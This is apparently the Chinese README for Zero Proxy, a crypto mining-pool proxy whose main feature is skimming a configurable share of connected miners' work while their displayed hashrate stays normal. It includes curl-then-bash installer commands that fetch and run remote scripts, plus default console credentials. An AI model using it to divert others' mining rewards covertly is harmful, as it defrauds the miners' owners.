支持定义多个监听端口，即启动一个代理，就能提供多个端口，分别连入不同的矿池。&lt;/li&gt; &#xA; &lt;li&gt;📦 高效抽水算法，极大减少矿机额外份额损失，客户端算力显示正常。&lt;/li&gt; &#xA; &lt;li&gt;💰 支持添加多个抽水账号，且每个账号可设置不同钱包地址及抽水比例，让您灵活定制抽水。&lt;/li&gt; &#xA; &lt;li&gt;🪟 固定 1% 开发费用，所有数据均可在控制台查看，无额外抽水。&lt;/li&gt; &#xA; &lt;li&gt;🔒 支持用户采用自定义证书来替换内置证书。&lt;/li&gt; &#xA; &lt;li&gt;⛏️ 控制台内置了多个常用矿池，方便您进行配置。&lt;/li&gt; &#xA; &lt;li&gt;🛡 采用 Go 及 Node.js 等前沿技术开发，安全可靠。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;⚖️ 免责声明 - Zero Proxy&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;仅为一般信息&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;Zero Proxy&#34;中提供的信息仅供一般性信息目的。我们尽信誉地提供项目中的所有信息，但我们不对任何类型的明示或暗示保证，包括但不限于准确性、充分性、有效性、可靠性、可用性或完整性作出任何保证。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;遵守法律&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;Zero Proxy&#34;是一个用于代理加密货币挖矿的工具。&#34;Zero Proxy&#34;的用户应独自负责确保其符合其所在司法管辖区的法律和规章。加密货币挖矿及其合法性在不同地区和国家/地区各不相同。用户必须确保他们使用 &#34;Zero Proxy&#34; 及相关活动符合当地、州、联邦、国家和国际法律。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;无责任&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;Zero Proxy&#34;的开发者和贡献者不会对任何非法或未授权使用此软件承担责任。该软件按“原样”提供，不附带任何形式的保证。用户承担使用此代理的所有风险，包括但不限于其各自司法管辖区内与加密货币挖矿相关的法律风险。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;免责声明的变更&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;我们保留随时修改本免责声明的权利。我们鼓励用户经常检查此页面以了解任何更改。在本免责声明发生任何更改后，您继续使用 &#34;Zero Proxy&#34; 将构成您对此类更改的接受。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;🖥 支持的操作系统&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Linux (Ubuntu / CentOS / Debian / AlmaLinux / Rocky Linux / Fedora)&lt;/li&gt; &#xA; &lt;li&gt;Windows 7 +&lt;/li&gt; &#xA; &lt;li&gt;macOS&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;📦 一键安装(Linux)&lt;/h2&gt; &#xA;&lt;p&gt;一键安装脚本包括了安装/卸载/启动/关闭/重启/更新等功能。本脚本支持 Ubuntu / CentOS / Debian / AlmaLinux / Rocky Linux / Fedora 等操作系统。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -o install.sh https://raw.githubusercontent.com/zero-proxy/zero-proxy/master/install.sh &amp;amp;&amp;amp; chmod u+x install.sh &amp;amp;&amp;amp; bash install.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;通过一键安装，Zero Proxy 自带了守护进程，无需额外进行设置。当安装完成本代理后，您依然可以通过 install.sh 脚本进行代理管理，其功能包括：安装、卸载、启动、关闭、重启、更新代理等。通过执行 install.sh 脚本并选取相应数字即可。若安装完成后无法使用 pm2 命令，请重新打开新的命令行再进行操作。&lt;/p&gt; &#xA;&lt;p&gt;安装完成后即可通过浏览器登陆web控制台（请确保3001端口在云服务商的安全组中已经开启）：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://ip:3001&#xA;&#xA;账号：zero-proxy&#xA;密码: zeroproxypwd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;账号密码可在&lt;a href=&#34;https://raw.githubusercontent.com/zero-proxy/zero-proxy/master/config.json&#34;&gt;config.json&lt;/a&gt;文件中配置。&lt;b&gt;请及时更改密码&lt;/b&gt;，以防止被恶意第三方扫描登陆。&lt;/p&gt; &#xA;&lt;h2&gt;更新日志&lt;/h2&gt; &#xA;&lt;h3&gt;2024-01-13&lt;/h3&gt; &#xA;&lt;p&gt;zero-proxy V1.3.0正式发布，支持多矿池协议及多币种代理。&lt;/p&gt; &#xA;&lt;h2&gt;💻 Web 控制台截图&lt;/h2&gt; &#xA;&lt;div&gt; &#xA; &lt;img src=&#34;https://zeroproxy.app/static/images/dashboard.png&#34;&gt; &#xA; &lt;img src=&#34;https://zeroproxy.app/static/images/workers.png&#34;&gt; &#xA; &lt;img src=&#34;https://zeroproxy.app/static/images/agents.png&#34;&gt; &#xA; &lt;img src=&#34;https://zeroproxy.app/static/images/proxy-config.png&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;⚒️ 手动安装及部署(Linux)&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/zero-proxy/zero-proxy.git&#xA;cd zero-proxy&#xA;chmod u+x zero-proxy_linux&#xA;&#xA;# 若未安装node.js，则先通过nvm安装，若已安装node.js可跳过&#xA;curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash&#xA;source ~/.nvm/nvm.sh&#xA;nvm install 16&#xA;&#xA;# 安装pm2，作为守护进程&#xA;npm install -g pm2&#xA;&#xA;# 初始化日志系统&#xA;pm2 install pm2-logrotate&#xA;pm2 set pm2-logrotate:max_size 20M&#xA;pm2 set pm2-logrotate:compress true&#xA;pm2 set pm2-logrotate:retain 10&#xA;&#xA;# 启动&#xA;pm2 start zero-proxy_linux --name zero-proxy -e logs/zero-proxy-error.log -o logs/zero-proxy-out.log&#xA;&#xA;# 停止&#xA;pm2 stop zero-proxy&#xA;&#xA;# 重启&#xA;pm2 restart zero-proxy&#xA;&#xA;# 查看日志&#xA;pm2 logs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;⚒️ 手动安装及部署(Windows)&lt;/h2&gt; &#xA;&lt;p&gt;进入&lt;a href=&#34;https://github.com/zero-proxy/zero-proxy/releases&#34;&gt;下载页面&lt;/a&gt;下载最新版本文件&lt;code&gt;zero-proxy_[version]_win64.zip&lt;/code&gt;，解压后运行 zero-proxy_win64.exe 即可。请注意，若直接运行则无守护进行，可参照上述命令安装 pm2 后运行。&lt;/p&gt; &#xA;&lt;h2&gt;✈️ 更新代理&lt;/h2&gt; &#xA;&lt;p&gt;可以通过 install.sh 脚本一键更新代理&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./install.sh&#xA;&#xA;# 输入: 6&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;⚙️ 手动更新（推荐使用 install.sh 脚本进行更新）&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd zero-proxy&#xA;git pull origin master&#xA;&#xA;# 删除之前的版本&#xA;pm2 delete zero-proxy&#xA;&#xA;# 启动最新版本&#xA;pm2 start zero-proxy_linux --name zero-proxy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;🗂️ 配置文件&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zero-proxy/zero-proxy/master/config.json&#34;&gt;config.js&lt;/a&gt;为矿池代理的配置文件，可以通过在控制台中设置，亦可直接在文件中配置。&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;配置&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;解释&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;maxWorkers&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;矿池最大连接数，设置为 0 则表示无上限（Linux 系统需要打开文件连接上限）&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;workerPrefix&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;全局矿机前缀，会加在矿机名的前面，在抽水账户的矿池界面中显示，设置为空则不添加前缀&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;user&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;控制台登录的用户密码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;agents&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水账户列表，可设置多个抽水账户，详细解释见下方，可在控制台中设置&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;servers&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;监听端口列表，可设置多个监听端口，分别连接不同的矿池，详细解释见下方，可在控制台中设置&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;cert&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;证书配置，可设置为内置证书或自定义证书，推荐通过控制台设置&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;agents 抽水账户配置 (建议通过 Web 控制台配置)&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;配置&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;解释&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;user&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水账户的钱包地址&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;password&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水账户接入矿池的密码，若无密码可不填，或填“x”&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;name&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水账户名称，仅做备注用，可随意命名&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;fee&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水比例，为 0 到 1 之间的数，若要设置为 1%抽水，则填 0.01&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;enable&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;是否开启该抽水账户&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;pool&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;抽水账户对应的矿池，包含币种，host, port 以及是否开启 TLS&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;servers 监听端口配置 (建议通过 Web 控制台配置)&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;配置&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;解释&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;port&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;表示矿池代理对接入连接的监听端口，一个监听端口可以对应连接一个矿池，请确保端口不被其它程序占用&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;tls&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;该监听端口是否要开启 TLS/SSL，若开启，则矿机需要相应开启 TLS/SSL 才可接入&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;pool&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;所有接入该监听端口的矿机，都将连接到本矿池中&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;id&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ID可不配置，系统会在后续启动中自动生成 ID，若手动配置，请确保 ID 不与现有 ID 重复&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;通过对监听端口、对应矿池的自由组合，我们可以配置成各种连接方式，如下所示：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&#34;servers&#34;: [&#xA;    {&#xA;      &#34;port&#34;: 10200,&#xA;      &#34;tls&#34;: false,&#xA;      &#34;pool&#34;: {&#xA;        &#34;host&#34;: &#34;etc.hiveon.com&#34;,&#xA;        &#34;port&#34;: 20443,&#xA;        &#34;tls&#34;: true,&#xA;        &#34;coin&#34;: &#34;ETC&#34;&#xA;      },&#xA;      &#34;id&#34;: &#34;etc&#34;&#xA;    },&#xA;    {&#xA;      &#34;port&#34;: 10201,&#xA;      &#34;tls&#34;: true,&#xA;      &#34;pool&#34;: {&#xA;        &#34;host&#34;: &#34;asia-rvn.2miners.com&#34;,&#xA;        &#34;port&#34;: 16060,&#xA;        &#34;tls&#34;: true,&#xA;        &#34;coin&#34;: &#34;RVN&#34;&#xA;      },&#xA;      &#34;id&#34;: &#34;rvn-tls&#34;&#xA;    },&#xA;    {&#xA;      &#34;port&#34;: 10300,&#xA;      &#34;tls&#34;: false,&#xA;      &#34;pool&#34;: {&#xA;        &#34;host&#34;: &#34;kawpow.auto.nicehash.com&#34;,&#xA;        &#34;port&#34;: 9200,&#xA;        &#34;tls&#34;: false,&#xA;        &#34;coin&#34;: &#34;NICEHASH-KAWPOW&#34;&#xA;      },&#xA;      &#34;id&#34;: &#34;nicehash&#34;&#xA;    },&#xA;  ],&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;该示例表示 Zero Proxy 开启了 3 个监听端口，分别为：&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;监听 10200 口，矿机到本代理的连接不开启 TLS，对应矿池为 hiveon，且从代理到矿池的连接开启 TLS。&lt;/li&gt; &#xA; &lt;li&gt;监听 10201 口，矿机到本代理的连接开启 TLS，对应矿池为 2miners，且从代理到矿池的连接也开启 TLS。&lt;/li&gt; &#xA; &lt;li&gt;监听 10300 口，矿机到本代理的连接不开启 TLS，对应矿池为 nicehash-kawpow，且从代理到矿池的连接也不开启 TLS。&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;💡 FAQ&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;抽水账号在矿池中显示的曲线为心电图，正常吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;抽水算法的目标是为了尽量提高抽水效率，尽最大可能降低对客户矿机的影响，这会导致抽水账户显示的算力曲线为心电图曲线，但是不影响收益，同时，客户矿机的算力曲线完全正常。&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;可以支持大规模的矿机接入吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;可以，在内部使用的过程中，我们仅使用单台aws-t3.micro服务器即可接入 3200+ 台矿机，并且能够长时间稳定运行，CPU保持在50%使用率内。&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;我自己部署 Zero Proxy 后，用户矿机接入多久后，我才能在控制台中看到抽水？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;为了保证用户体验，在矿机第一次接入时，会优先为矿机客户工作，约2-4小时候后会进入第一次抽水时间，届时可进入控制台中查看，请耐心等待。而后每隔一定时间开启新一轮抽水。若矿机中途掉线，重新连接后会自动恢复掉线前的状态，以保证整体抽水比例与设定值一致。&lt;/p&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;TLS和SSL的区别是什么，我通过代理开启了TLS，还需要开启SSL吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;不需要，TLS即是最新版本的SSL，具有全部的SSL功能，同时比旧的SSL更加安全可靠。通常情况下我们认为TLS和SSL是一样的，都代表对传输层进行可靠的安全加密，可以进行混用，不需要做额外区分。&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;可以用一个代理同时接入多个矿池吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;可以，通过上述示例配置，我们就让本代理同时接入了hiveon和2miners和nicehash中，客户端只要连接不同的端口（分别为10200，10201，10300）即可接入不同的矿池。&lt;/p&gt; &#xA;&lt;ol start=&#34;6&#34;&gt; &#xA; &lt;li&gt;为什么我设置了监听端口，但是客户端机器还是连接不进来&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;通常情况下，云服务商（如亚马逊云）会在安全组中限制接入的端口，当你创建了一个监听端口时，请务必确保该端口在云服务商控制台的安全组中也被放行。&lt;/p&gt; &#xA;&lt;ol start=&#34;7&#34;&gt; &#xA; &lt;li&gt;pm2 是什么，可以不使用吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;pm2 是一个类似于 supervisor 的守护进程，能够保证 Zero Proxy 在任何时候都能够稳定运行，非常建议配合使用。&lt;/p&gt; &#xA;&lt;ol start=&#34;8&#34;&gt; &#xA; &lt;li&gt;开发费用是固定的吗？如何查看？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Zero Proxy 固定抽取1%作为开发费用，无论用户添加几个抽水账号，设置多少抽水比例，该费用均不变。用户可通过控制台、后端日志或者抓取流量包的形式进行判断。&lt;/p&gt; &#xA;&lt;ol start=&#34;9&#34;&gt; &#xA; &lt;li&gt;我想定制属于自己的 Zero Proxy , 内置我的抽水钱包地址，可以吗？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Zero Proxy 团队支持您定制属于自己的 Zero Proxy 项目，内置您的抽水钱包以及自定义抽水比例，并为您部署过程提供技术支持。若您有这方面需求，可联系邮箱&lt;a href=&#34;mailto:zeroproxytech@gmail.com&#34;&gt;zeroproxytech@gmail.com&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h2&gt;❤️ 捐赠&lt;/h2&gt; &#xA;&lt;p&gt;BTC: bc1qu0atqnnp3ms7dcc42y76aa7a9fwtyzrdzgm8cy&lt;/p&gt; &#xA;&lt;p&gt;ETH: 0xa99428129b7278f20470d72d287B8FEb4276A046&lt;/p&gt; &#xA;&lt;p&gt;USDT: 0xa99428129b7278f20470d72d287B8FEb4276A046&lt;/p&gt;</summary>
  </entry>
</feed>